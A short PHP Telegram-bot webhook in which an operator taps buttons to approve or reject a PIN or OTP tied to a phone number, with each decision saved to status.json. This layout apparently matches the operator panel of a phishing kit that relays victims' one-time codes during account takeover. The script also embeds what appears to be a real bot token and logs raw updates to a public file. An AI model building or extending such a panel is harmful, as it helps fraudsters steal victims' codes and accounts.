<?php
$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8"; // put your real bot token here

// Get Telegram update safely
$update = json_decode(file_get_contents("php://input"), true);

// Debug log (VERY IMPORTANT for troubleshooting)
file_put_contents("log.txt", date("Y-m-d H:i:s") . " | " . json_encode($update) . "\n", FILE_APPEND);

// Check if button was clicked
if(isset($update["callback_query"])){

    $callback = $update["callback_query"];

    $callbackId = $callback["id"];
    $data = $callback["data"] ?? "";
    $chatId = $callback["message"]["chat"]["id"];
    $messageId = $callback["message"]["message_id"];

    // Split safely
    $parts = explode("_", $data);

    // Prevent crash if format is wrong
    if(count($parts) < 3){

        // Still answer Telegram so button doesn't freeze
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callbackId&text=Invalid data&show_alert=false");
        exit();
    }

    $action = $parts[0]; // approve / reject
    $type   = $parts[1]; // pin / otp
    $phone  = $parts[2]; // phone number

    // Validate values (extra safety)
    if(!in_array($action, ["approve","reject"]) || !in_array($type, ["pin","otp"])){

        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callbackId&text=Invalid format&show_alert=false");
        exit();
    }

    // ===== SAVE STATUS (JSON) =====
    $file = __DIR__ . "/status.json";

    $statuses = [];
    if(file_exists($file)){
        $statuses = json_decode(file_get_contents($file), true);
    }

    $statuses[$phone][$type] = $action;

    file_put_contents($file, json_encode($statuses));

    // ===== RESPONSE MESSAGE =====
    if($action == "approve"){
        $text = "✅ " . strtoupper($type) . " Approved";
    } else {
        $text = "❌ " . strtoupper($type) . " Rejected";
    }

    $text_encoded = urlencode($text);

 $newText = $callback["message"]["text"] . "\n\n" . $text;

file_get_contents("https://api.telegram.org/bot$token/editMessageText?" . http_build_query([
    'chat_id' => $chatId,
    'message_id' => $messageId,
    'text' => $newText
]));

    // ===== VERY IMPORTANT: MAKE BUTTON CLICKABLE =====
    file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callbackId&text=Done&show_alert=false");

    exit();
}
?>